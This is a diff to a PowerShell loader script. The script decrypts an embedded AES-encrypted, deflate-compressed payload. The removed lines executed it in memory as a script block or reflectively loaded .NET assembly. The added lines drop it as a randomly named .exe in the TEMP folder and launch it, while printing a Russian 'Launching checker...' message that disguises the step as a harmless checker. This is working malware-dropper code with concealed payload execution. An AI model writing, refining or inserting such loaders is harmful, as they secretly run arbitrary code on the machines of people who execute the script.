@@ -65,9 +65,8 @@ try {
     $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
     $aes.Key = [Convert]::FromBase64String($keyB64)
     $aes.IV = [Convert]::FromBase64String($ivB64)
-    $decryptor = $aes.CreateDecryptor()
     $encBytes = [Convert]::FromBase64String($encB64)
-    $decBytes = $decryptor.TransformFinalBlock($encBytes, 0, $encBytes.Length)
+    $decBytes = $aes.CreateDecryptor().TransformFinalBlock($encBytes, 0, $encBytes.Length)
 
     $ms = New-Object System.IO.MemoryStream(,$decBytes)
     $ds = New-Object System.IO.Compression.DeflateStream($ms, [System.IO.Compression.CompressionMode]::Decompress)
@@ -75,18 +74,9 @@ try {
     $ds.CopyTo($msOut)
     $payloadBytes = $msOut.ToArray()
 
-    try {
-        $payloadText = [System.Text.Encoding]::Unicode.GetString($payloadBytes)
-        if ($payloadText -match "^\s*param\(" -or $payloadText -match "function ") {
-            $sb = [ScriptBlock]::Create($payloadText)
-            & $sb
-        } else { throw "not ps1" }
-    } catch {
-        $asm = [Reflection.Assembly]::Load($payloadBytes)
-        $entry = $asm.EntryPoint
-        if ($entry) { $entry.Invoke($null, (, [object[]] @())) } else { [Reflection.Assembly]::Load($payloadBytes) | Out-Null }
-    }
-
+    $tmp = Join-Path $env:TEMP ([IO.Path]::GetRandomFileName() + ".exe")
+    [IO.File]::WriteAllBytes($tmp, $payloadBytes)
+    Start-Process -FilePath $tmp -WorkingDirectory $env:TEMP
     Write-Host "[+] Запуск чекера..." -ForegroundColor Green
 }
 catch {
